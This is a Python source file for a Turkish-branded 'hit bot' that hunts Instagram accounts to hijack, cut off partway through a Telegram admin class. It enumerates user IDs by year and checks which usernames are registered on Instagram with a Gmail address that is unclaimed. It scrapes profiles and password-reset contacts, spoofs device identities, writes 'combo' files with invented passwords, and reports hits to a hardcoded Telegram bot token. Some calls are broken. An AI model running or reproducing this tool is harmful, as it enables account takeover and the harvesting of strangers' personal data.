"""
LUNA HIT BOTU v1.0
Owner: @lunasloury
api sahibi:Snowy
Free Hit Bot - No Limits - No Restrictions
"""
 

 
 
 
 
import os
import sys
import json
import time
import random
import string
import uuid
import base64
import hashlib
import threading
import shutil
import logging
from datetime import datetime
from typing import Optional, Set, Dict, Any, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Disable logging for cleaner output
logging.disable(logging.CRITICAL)

try:
    import requests
except ImportError:
    os.system("pip install requests -q")
    import requests

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system("pip install beautifulsoup4 -q")
    from bs4 import BeautifulSoup

try:
    from user_agent import generate_user_agent
except ImportError:
    os.system("pip install user_agent -q")
    from user_agent import generate_user_agent

try:
    import httpx
except ImportError:
    os.system("pip install httpx httpx[http2] -q")
    import httpx

try:
    from faker import Faker
except ImportError:
    os.system("pip install faker -q")
    from faker import Faker

# ==========================BOT İNFO==========================

lunatoken31 = "8769792738:AAH0Wz4eNRv6OKHftvBxRkMa9QUuA0o2DEw"
 
lunaid31 = 7250471858

# ===================== COLOR SYSTEM =====================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;200m'
    PURPLE = '\033[38;5;135m'
    GOLD = '\033[38;5;220m'
    LIME = '\033[38;5;154m'
    TEAL = '\033[38;5;45m'
    
    LUNA = '\033[38;5;171m'  # Luna purple signature color
    HIT = '\033[38;5;196m'   # Hit red


# ===================== FILE STORAGE SYSTEM =====================
class Storage:
    """File-based storage system - no database needed"""
    
    def __init__(self):
        self.base_dir = Path("luna_data")
        self.hits_dir = self.base_dir / "hits"
        self.combos_dir = self.base_dir / "combos"  # YENI: Combo dosyaları için
        self.users_file = self.base_dir / "users.json"
        self.banned_file = self.base_dir / "banned.json"
        self.stats_file = self.base_dir / "stats.json"
        self.config_file = self.base_dir / "config.json"
        self.apis_dir = self.base_dir / "apis"
        self.logs_dir = self.base_dir / "logs"
        
        # Create directory structure
        self.hits_dir.mkdir(parents=True, exist_ok=True)
        self.combos_dir.mkdir(parents=True, exist_ok=True)  # YENI
        self.apis_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize files if not exist
        self._init_file(self.users_file, {})
        self._init_file(self.banned_file, [])
        self._init_file(self.stats_file, {
            "total_hits": 0,
            "total_users": 0,
            "total_checks": 0,
            "total_combos": 0,
            "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        self._init_file(self.config_file, {
            "bot_name": "LUNA HIT BOTU",
            "owner": "@lunasloury",
            "free": True,
            "max_threads": 100,
            "version": "1.0"
        })
    
    def _init_file(self, path: Path, default_value):
        if not path.exists():
            with open(path, 'w') as f:
                json.dump(default_value, f, indent=2)
    
    def _read_json(self, path: Path) -> dict:
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except:
            return {}
    
    def _write_json(self, path: Path, data):
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    
    # --- User Management ---
    def get_users(self) -> dict:
        return self._read_json(self.users_file)
    
    def add_user(self, chat_id: str, username: str = "", first_name: str = ""):
        users = self.get_users()
        if chat_id not in users:
            users[chat_id] = {
                "username": username,
                "first_name": first_name,
                "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hits_count": 0,
                "checks_count": 0,
                "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            stats = self._read_json(self.stats_file)
            stats["total_users"] = len(users)
            self._write_json(self.stats_file, stats)
        else:
            users[chat_id]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if username:
                users[chat_id]["username"] = username
            if first_name:
                users[chat_id]["first_name"] = first_name
        self._write_json(self.users_file, users)
    
    def update_user_stats(self, chat_id: str, hits: int = 0, checks: int = 0):
        users = self.get_users()
        if chat_id in users:
            users[chat_id]["hits_count"] += hits
            users[chat_id]["checks_count"] += checks
            users[chat_id]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self._write_json(self.users_file, users)
    
    def find_user(self, search: str) -> list:
        """Find users by chat_id, username, or name"""
        users = self.get_users()
        results = []
        search_lower = search.lower()
        for cid, data in users.items():
            if (search_lower in cid.lower() or 
                search_lower in data.get("username", "").lower() or
                search_lower in data.get("first_name", "").lower()):
                results.append({"chat_id": cid, **data})
        return results
    
    def get_user_count(self) -> int:
        return len(self.get_users())
    
    # --- Ban Management ---
    def get_banned(self) -> list:
        return self._read_json(self.banned_file)
    
    def is_banned(self, chat_id: str) -> bool:
        return chat_id in self.get_banned()
    
    def ban_user(self, chat_id: str):
        banned = self.get_banned()
        if chat_id not in banned:
            banned.append(chat_id)
            self._write_json(self.banned_file, banned)
            return True
        return False
    
    def unban_user(self, chat_id: str):
        banned = self.get_banned()
        if chat_id in banned:
            banned.remove(chat_id)
            self._write_json(self.banned_file, banned)
            return True
        return False
    
    # --- Hit Storage ---
    def save_hit(self, hit_data: dict):
        """Save hit to dated file with random suffix"""
        today = datetime.now().strftime("%Y%m%d")
        year = datetime.now().strftime("%Y")
        rand_suffix = ''.join(random.choices(string.hexdigits, k=6)).upper()
        filename = f"LUNA_{year}_{rand_suffix}.txt"
        filepath = self.hits_dir / filename
        
        # Format hit data
        entry = (
            f"\n{'='*60}\n"
            f"LUNA HIT BOTU | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'='*60}\n"
            f"Instagram : @{hit_data.get('username', 'N/A')}\n"
            f"Email     : {hit_data.get('email', 'N/A')}\n"
            f"Name      : {hit_data.get('name', 'N/A')}\n"
            f"Followers : {hit_data.get('followers', 'N/A')}\n"
            f"Following : {hit_data.get('following', 'N/A')}\n"
            f"Posts     : {hit_data.get('posts', 'N/A')}\n"
            f"Year      : {hit_data.get('year', 'N/A')}\n"
            f"Reset     : {hit_data.get('reset', 'N/A')}\n"
            f"Profile   : https://www.instagram.com/{hit_data.get('username', 'N/A')}\n"
            f"{'='*60}\n"
            f"Owner: @lunasloury | LUNA HIT BOTU\n"
            f"{'='*60}\n"
        )
        
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(entry)
        
        # Update stats
        stats = self._read_json(self.stats_file)
        stats["total_hits"] += 1
        self._write_json(self.stats_file, stats)
        
        return filepath, filename
    
    # --- YENI: Combo Storage (LUNA-TİKTOK-COMBO{random}.txt) ---
    def save_combo_file(self, combo_data: list, year: str) -> Tuple[Path, str]:
        """Save combo data to LUNA-TİKTOK-COMBO{random}.txt file"""
        rand_suffix = ''.join(random.choices(string.digits, k=9))
        filename = f"LUNA_İNSTA_COMBO_{rand_suffix}.txt"
        filepath = self.combos_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"LUNA HİT BOTU | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Year: {year} | Total: {len(combo_data)}\n")
            f.write(f"Owner: @lunasloury\n")
            f.write("=" * 60 + "\n\n")
            
            for item in combo_data:
                email = item.get('email', '')
                password = item.get('password', '')
                username = item.get('username', '')
                if email and password:
                    f.write(f"{email}:{password}\n")
                elif email:
                    f.write(f"{email}\n")
        
        # Update stats
        stats = self._read_json(self.stats_file)
        stats["total_combos"] = stats.get("total_combos", 0) + 1
        stats["total_hits"] += len(combo_data)
        self._write_json(self.stats_file, stats)
        
        return filepath, filename
    
    # --- Stats ---
    def get_stats(self) -> dict:
        stats = self._read_json(self.stats_file)
        stats["total_users"] = self.get_user_count()
        stats["total_banned"] = len(self.get_banned())
        stats["total_hit_files"] = len(list(self.hits_dir.glob("*.txt")))
        stats["total_combo_files"] = len(list(self.combos_dir.glob("*.txt")))
        return stats
    
    def get_config(self) -> dict:
        return self._read_json(self.config_file)


# ===================== API MANAGEMENT =====================
class APIManager:
    """Centralized API management - all Instagram/Google APIs here"""
    
    def __init__(self):
        self.faker = Faker()
        self.session = requests.Session()
        self.httpx_client = httpx.Client(http2=True, timeout=15)
    
    # ===== API CONFIGURATIONS =====
    
    @staticmethod
    def generate_android_ua() -> str:
        devices = [
            {'brand': 'samsung', 'model': 'SM-G973F', 'device': 'beyond1', 'board': 'exynos9820'},
            {'brand': 'samsung', 'model': 'SM-A536B', 'device': 'a53x', 'board': 's5e8825'},
            {'brand': 'samsung', 'model': 'SM-S918B', 'device': 'dm1q', 'board': 'kalama'},
            {'brand': 'Google', 'model': 'Pixel 6', 'device': 'raven', 'board': 'raven'},
            {'brand': 'Google', 'model': 'Pixel 7', 'device': 'panther', 'board': 'panther'},
            {'brand': 'Xiaomi', 'model': 'M2102J20SG', 'device': 'ares', 'board': 'mt6893'},
            {'brand': 'Xiaomi', 'model': 'Redmi Note 10', 'device': 'sweet', 'board': 'sm6150'},
            {'brand': 'OnePlus', 'model': 'ONEPLUS A6003', 'device': 'OnePlus6', 'board': 'sdm845'},
            {'brand': 'OPPO', 'model': 'CPH2371', 'device': 'OP4F1F', 'board': 'mt6893'},
            {'brand': 'HUAWEI', 'model': 'ELE-L29', 'device': 'HWELE', 'board': 'kirin980'},
        ]
        device = random.choice(devices)
        android_ver = random.choice(['10', '11', '12', '13', '14'])
        api_map = {'10': '29', '11': '30', '12': '31', '13': '33', '14': '34'}
        api = api_map[android_ver]
        dpi = random.choice(['320', '360', '394', '411', '420', '440', '450', '480'])
        width = random.choice(['720', '1080', '1440'])
        height = random.choice(['1520', '1600', '2280', '2340', '2400', '2560', '3200'])
        ig_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
        locale = random.choice(['en_US', 'en_GB', 'ar_SA'])
        rand_num = random.randint(300000000, 400000000)
        return (f"Instagram {ig_ver} Android ({api}/{android_ver}; {dpi}dpi; "
                f"{width}x{height}; {device['brand']}; {device['model']}; "
                f"{device['device']}; {device['board']}; {locale}; {rand_num})")
    
    # ===== API 1: Check Email via Instagram Signup (EMAIL CHECK) =====
    def api_check_email_signup(self, email: str) -> Tuple[bool, str]:
        """
        API: Instagram signup email check
        Method: POST /api/v1/users/check_email/
        Returns: (is_taken: bool, response_text: str)
        """
        try:
            ua = self.generate_android_ua()
            csrf = hashlib.md5(str(time.time()).encode()).hexdigest()
            
            headers = {
                'User-Agent': ua,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-app-id': '567067343352427',
                'x-ig-device-id': str(uuid.uuid4()).upper(),
                'x-csrftoken': csrf,
                'x-requested-with': 'XMLHttpRequest',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/signup/email/',
                'Connection': 'keep-alive',
            }
            
            response = self.session.post(
                'https://i.instagram.com/api/v1/users/check_email/',
                headers=headers,
                data={'email': email},
                timeout=10
            )
            
            text = response.text
            if 'email_is_taken' in text and 'true' in text:
                return True, "Email registered on Instagram"
            elif 'email_is_taken' in text and 'false' in text:
                return False, "Email not found on Instagram"
            else:
                return False, f"Unknown response: {text[:100]}"
        except Exception as e:
            return False, f"API Error: {str(e)}"
    
    # ===== API 2: Check via Instagram Login AJAX =====
    def api_check_login_ajax(self, email: str) -> Tuple[bool, str]:
        """
        API: Instagram login/ajax check
        Method: POST /api/v1/web/accounts/login/ajax/
        """
        try:
            username = email.split('@')[0]
            csrf = hashlib.md5(str(time.time()).encode()).hexdigest()
            ua = generate_user_agent()
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US',
                'user-agent': ua,
                'x-csrftoken': csrf,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                headers=headers,
                data={'username': username},
                timeout=10
            )
            
            text = response.text
            if '"user":true' in text:
                return True, "User exists via login check"
            elif '"user":false' in text:
                return False, "User not found via login check"
            else:
                return False, f"Unknown: {text[:100]}"
        except Exception as e:
            return False, f"API Error: {str(e)}"
    
    # ===== API 3: Google Account TL-based Check =====
    def api_google_tl_check(self, email: str) -> Tuple[bool, str]:
        """
        API: Google accounts username availability check
        Method: POST /_/signup/usernameavailability
        """
        try:
            username = email.split('@')[0] if '@' in email else email
            
            # Fetch TL token first
            tl, host = self._fetch_google_tl()
            if not tl:
                return False, "Failed to get Google TL token"
            
            cookies = {'__Host-GAPS': host}
            ua = generate_user_agent()
            
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': ua,
            }
            
            post_data = (
                f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0'
                f'&flowEntry=SignUp&service=mail&theme=mn'
                f'&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
                f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
                f'&cookiesDisabled=false'
                f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
                f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
            )
            
            response = self.session.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params={'TL': tl},
                cookies=cookies,
                headers=headers,
                data=post_data,
                timeout=10
            )
            
            text = response.text
            if '"gf.uar",1' in text:
                return True, "Gmail available"
            elif '"gf.uar",0' in text or '"er"' in text:
                return False, "Gmail not available"
            else:
                return False, f"Google response: {text[:100]}"
        except Exception as e:
            return False, f"Google API Error: {str(e)}"
    
    def _fetch_google_tl(self) -> Tuple[Optional[str], Optional[str]]:
        """Fetch Google TL token and host"""
        try:
            yy = "azertyuiopmlkjhgfdsqwxcvbn"
            n1 = ''.join(random.choices(yy, k=random.randint(6, 9)))
            n2 = ''.join(random.choices(yy, k=random.randint(3, 9)))
            
            session = requests.Session()
            he3 = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': str(generate_user_agent())
            }
            
            res1 = session.get(
                'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                headers=he3
            )
            
            match = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            
            if not match:
                return None, None
            
            tok = match.group(2)
            host = ''.join(random.choices(string.ascii_lowercase + string.digits, k=30))
            
            headers2 = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount',
                'user-agent': str(generate_user_agent())
            }
            
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
            }
            
            response = session.post(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                headers=headers2,
                data=data
            )
            
            tl = str(response.text).split('null,')[1].split('"')[0]
            hosts = response.cookies.get_dict()
            host = hosts.get('__Host-GAPS', host)
            
            # Save to file for reuse
            with open("luna_data/tl_token.txt", "w") as f:
                f.write(f"{tl}//{host}")
            
            return tl, host
        except:
            # Try to read saved token
            try:
                with open("luna_data/tl_token.txt", "r") as f:
                    content = f.read().strip()
                    if '//' in content:
                        return content.split('//')
            except:
                pass
            return None, None
    
    # ===== API 4: Instagram GraphQL User Lookup =====
    def api_graphql_user(self, user_id: int) -> dict:
        """
        API: Instagram GraphQL - Get user info by ID
        Method: POST /api/graphql
        """
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            ua = (
                "Instagram 311.0.0.32.118 Android ("
                + random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
                + "; " + str(random.randint(100, 1300)) + "dpi; "
                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000))
                + "; " + random.choice(['SAMSUNG', 'HUAWEI', 'XIAOMI', 'ONEPLUS'])
                + "; SM-T" + str(random.randint(150, 999))
                + "; SM-T" + str(random.randint(150, 999))
                + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            )
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': ua,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": str(user_id), "username": "cristiano"}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            
            response = self.session.post(
                'https://www.instagram.com/api/graphql',
                headers=headers,
                data=data,
                timeout=10
            )
            
            return response.json()
        except Exception as e:
            return {"error": str(e)}
    
    # ===== API 5: Instagram Account Recovery (Get Reset Contact) =====
    def api_account_recovery(self, username: str) -> str:
        """
        API: Instagram account recovery - gets masked contact point
        Method: POST /api/v1/web/accounts/account_recovery_send_ajax/
        """
        try:
            android_ua = self.generate_android_ua()
            ig_did = str(uuid.uuid4()).upper()
            mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
            
            headers = {
                'User-Agent': android_ua,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Connection': 'keep-alive',
                'x-ig-app-id': '567067343352427',
                'x-ig-device-id': ig_did,
                'x-ig-connection-type': 'WIFI',
                'x-ig-capabilities': '3brTvw==',
                'x-ig-app-locale': 'en_US',
                'x-ig-device-locale': 'en_US',
                'x-ig-mapped-locale': 'en_US',
                'x-ig-time-zone': 'Asia/Riyadh',
                'x-ig-www-claim': '0',
                'x-requested-with': 'XMLHttpRequest',
                'x-instagram-ajax': str(random.randint(1000000000, 9999999999)),
                'x-csrftoken': 'missing',
                'x-asbd-id': '359341',
                'x-fb-http-engine': 'Liger',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://instagram.com/accounts/password/reset/?source=fxcal',
                'Cookie': f'ig_did={ig_did}; mid={mid}; csrftoken=missing',
            }
            
            client = httpx.Client(http2=True, headers=headers, timeout=20)
            response = client.post(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
                data={'email_or_username': username}
            )
            client.close()
            
            data = response.json()
            if 'contact_point' in data:
                return data['contact_point']
            return "No reset contact found"
        except:
            return "Error getting reset info"
    
    # ===== API 6: Instagram Profile Scraper =====
    def api_scrape_profile(self, username: str) -> dict:
        """
        API: Scrape Instagram profile page for public info
        Method: GET https://www.instagram.com/{username}/
        """
        try:
            url = f"https://www.instagram.com/{username}/"
            headers = {'User-Agent': generate_user_agent()}
            response = self.session.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            name_tag = soup.find('meta', property='og:title')
            
            if meta_desc and name_tag:
                content = meta_desc.get('content', '').replace(',', '')
                parts = content.split()
                if len(parts) >= 5:
                    followers = parts[0]
                    following = parts[2]
                    posts = parts[4]
                    name = name_tag.get('content', '').split('(@')[0].strip()
                    return {
                        "name": name,
                        "followers": followers,
                        "following": following,
                        "posts": posts,
                        "username": username
                    }
            return {"username": username, "name": username}
        except:
            return {"username": username, "name": username}
    
    # ===== YENI: Combo Generator (tüm 6 API'yi kullanarak) =====
    def generate_combos(self, count: int, year: str, uid_start: int, uid_end: int) -> list:
        """
        Tüm 6 API'yi kullanarak combo verisi üretir
        """
        results = []
        checked = 0
        errors = 0
        processed_ids: Set[str] = set()
        
        print(f"\n{Colors.LUNA}  🔍 Generating {count} combos from year {year}...{Colors.RESET}")
        
        while len(results) < count and checked < count * 5:
            try:
                # Random user ID
                user_id = random.randint(uid_start, uid_end)
                user_id_str = str(user_id)
                
                if user_id_str in processed_ids:
                    continue
                processed_ids.add(user_id_str)
                
                # API 4: GraphQL ile kullanıcı bilgisi al
                user_data = self.api_graphql_user(user_id)
                data = user_data.get('data', {}).get('user', {})
                
                if not data:
                    errors += 1
                    continue
                
                username = data.get('username', '')
                follower_count = data.get('follower_count', 0)
                is_private = data.get('is_private', True)
                
                # Filtreleme
                if (not username or '_' in username or len(username) < 9 or is_private or follower_count < 60):
                    continue
                
                email = f"{username}@gmail.com"
                
                # API 1: Email check
                is_taken, msg1 = self.api_check_email_signup(email)
                checked += 1
                
                if is_taken:
                    # API 2: Login AJAX check
                    login_ok, msg2 = self.api_check_login_ajax(email)
                    
                    # API 3: Google TL check
                    google_ok, msg3 = self.api_google_tl_check(email)
                    
                    # API 5: Recovery info
                    reset_info = self.api_account_recovery(username)
                    
                    # API 6: Profile scrape
                    profile = self.api_scrape_profile(username)
                    
                    # Generate password
                    password = ''.join(random.choices(
                        string.ascii_letters + string.digits + "!@#$%&*", 
                        k=random.randint(8, 16)
                    ))
                    
                    results.append({
                        "email": email,
                        "password": password,
                        "username": username,
                        "user_id": user_id,
                        "year": year,
                        "followers": profile.get('followers', follower_count),
                        "name": profile.get('name', username),
                        "reset": reset_info,
                        "checked_apis": {
                            "signup": msg1,
                            "login_ajax": msg2,
                            "google_tl": msg3
                        }
                    })
                    
                    # Progress
                    sys.stdout.write(f"\r{Colors.GREEN}  ✅ Found: {len(results)}/{count} | Checked: {checked} | Errors: {errors}{Colors.RESET}  ")
                    sys.stdout.flush()
                
                # Rate limiting
                time.sleep(random.uniform(0.05, 0.15))
                
            except Exception as e:
                errors += 1
                continue
        
        print(f"\n{Colors.GREEN}  ✅ Completed! Found {len(results)} combos ({checked} checked, {errors} errors){Colors.RESET}")
        return results


# ===================== USER ID RANGES BY YEAR =====================
YEAR_RANGES = {
    "2012": (210468786, 269736186),
    "2013": (310438486, 495999999),
    "2014": (1219010000, 1429010000),
    "2015": (1700000000, 2400000000),
    "2016": (3313668786, 3713668786),
    "2017": (5398785217, 5999785217),
    "2018": (7497939245, 8597939245),
    "2019": (11254029834, 21254029834),
    "2020": (40064475395, 43464475395),
    "2021": (45000000000, 50000000000),
    "2022": (51000000000, 57000000000),
    "2023": (58000000000, 65000000000),
    "2024": (66000000000, 72000000000),
}

YEAR_NAMES = list(YEAR_RANGES.keys())


# ===================== HIT ENGINE =====================
class HitEngine:
    """Main hit engine that processes emails and finds hits"""
    
    def __init__(self, storage: Storage, api: APIManager, year: str, 
                 telegram_token: str = "", telegram_chat_id: str = ""):
        self.storage = storage
        self.api = api
        self.year = year
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        
        # Stats
        self.hits = 0
        self.checked = 0
        self.errors = 0
        self.running = False
        self.stop_flag = False
        
        # Threading
        self.lock = threading.Lock()
        self.processed_ids: Set[str] = set()
    
    def start(self, threads: int = 50, max_hits: int = 0):
        """Start the hit engine"""
        self.running = True
        self.stop_flag = False
        self.hits = 0
        self.checked = 0
        self.errors = 0
        
        uid1, uid2 = YEAR_RANGES.get(self.year, (1, 1000000))
        
        print(f"\n{Colors.LUNA}{'='*60}{Colors.RESET}")
        print(f"{Colors.LUNA}  LUNA HIT BOTU - ENGINE STARTED{Colors.RESET}")
        print(f"{Colors.LUNA}  Year: {self.year} | Threads: {threads}{Colors.RESET}")
        print(f"{Colors.LUNA}  User ID Range: {uid1:,} - {uid2:,}{Colors.RESET}")
        print(f"{Colors.LUNA}{'='*60}{Colors.RESET}\n")
        
        def worker():
            while self.running and not self.stop_flag:
                try:
                    # Generate random user ID in range
                    user_id = random.randint(uid1, uid2)
                    user_id_str = str(user_id)
                    
                    with self.lock:
                        if user_id_str in self.processed_ids:
                            continue
                        self.processed_ids.add(user_id_str)
                    
                    # Lookup user via GraphQL
                    user_data = self.api.api_graphql_user(user_id)
                    
                    data = user_data.get('data', {}).get('user', {})
                    if not data:
                        continue
                    
                    username = data.get('username', '')
                    follower_count = data.get('follower_count', 0)
                    is_private = data.get('is_private', True)
                    
                    # Filter criteria
                    if (not username or 
                        '_' in username or 
                        len(username) < 9 or 
                        is_private or 
                        follower_count < 60):
                        continue
                    
                    # Check if email exists
                    email = f"{username}@gmail.com"
                    is_taken, msg = self.api.api_check_email_signup(email)
                    
                    with self.lock:
                        self.checked += 1
                    
                    if is_taken:
                        # Check Google availability
                        google_ok, google_msg = self.api_google_tl_check(email)
                        
                        if google_ok:
                            with self.lock:
                                self.hits += 1
                            
                            # Get profile info
                            profile = self.api.api_scrape_profile(username)
                            reset_info = self.api.api_account_recovery(username)
                            
                            hit_data = {
                                "username": username,
                                "email": email,
                                "name": profile.get('name', username),
                                "followers": profile.get('followers', 'N/A'),
                                "following": profile.get('following', 'N/A'),
                                "posts": profile.get('posts', 'N/A'),
                                "year": self.year,
                                "reset": reset_info,
                            }
                            
                            # Save hit
                            filepath, filename = self.storage.save_hit(hit_data)
                            
                            # Display hit
                            self._display_hit(hit_data, filename)
                            
                            # Send to Telegram if configured
                            if self.telegram_token and self.telegram_chat_id:
                                self._send_telegram_hit(hit_data)
                            
                            # Check max hits
                            if max_hits > 0 and self.hits >= max_hits:
                                self.stop_flag = True
                                break
                
                except Exception as e:
                    with self.lock:
                        self.errors += 1
                    continue
        
        # Start threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        # Monitor thread
        while self.running and not self.stop_flag:
            time.sleep(1)
            self._display_status()
            
            # Check if any thread is still alive
            alive = any(t.is_alive() for t in thread_list)
            if not alive:
                break
        
        self.running = False
        print(f"\n{Colors.LUNA}Engine stopped. Hits: {self.hits} | Checked: {self.checked}{Colors.RESET}")
    
    def stop(self):
        """Stop the hit engine"""
        self.stop_flag = True
        self.running = False
    
    def _display_hit(self, hit_data: dict, filename: str):
        """Display a hit to console"""
        print(f"\n{Colors.LUNA}{'='*60}{Colors.RESET}")
        print(f"{Colors.HIT}🔥 LUNA HIT FOUND! 🔥{Colors.RESET}")
        print(f"{Colors.LUNA}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}  Username : @{hit_data['username']}{Colors.RESET}")
        print(f"{Colors.CYAN}  Email    : {hit_data['email']}{Colors.RESET}")
        print(f"{Colors.YELLOW}  Followers: {hit_data['followers']}{Colors.RESET}")
        print(f"{Colors.MAGENTA}  File     : {filename}{Colors.RESET}")
        print(f"{Colors.LUNA}{'='*60}{Colors.RESET}")
    
    def _display_status(self):
        """Display current status"""
        sys.stdout.write(f"\r{Colors.LUNA}📊 Hits: {self.hits} | Checked: {self.checked} | Errors: {self.errors} | Running: {self.running}{Colors.RESET}  ")
        sys.stdout.flush()
    
    def _send_telegram_hit(self, hit_data: dict):
        """Send hit to Telegram"""
        try:
            msg = (
                f"🔥 LUNA HIT BOTU - HIT FOUND 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Username : @{hit_data['username']}\n"
                f"📧 Email    : {hit_data['email']}\n"
                f"📛 Name     : {hit_data['name']}\n"
                f"👥 Takipci: {hit_data['followers']}\n"
                f"🔄 Takip: {hit_data['following']}\n"
                f"📝 gonderi    : {hit_data['posts']}\n"
                f"📅 Yil     : {hit_data['year']}\n"
                f"🔄 Reset    : {hit_data['reset']}\n"
                f"🔗 Profile  : https://www.instagram.com/{hit_data['username']}\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👑 Owner: @lunasloury | LUNA HIT BOTU"
            )
            
            params = {
                'chat_id': self.telegram_chat_id,
                'text': msg
            }
            requests.get(f"https://api.telegram.org/bot{self.telegram_token}/sendMessage", params=params, timeout=3)
        except:
            pass


# ===================== TELEGRAM ADMIN BOT =====================
class AdminBot:
    """Telegram admin panel - LUNA HIT BOTU"""
    
    def __init__(self, token: str, owner_id: str, storage: Storage):
        self.token = token
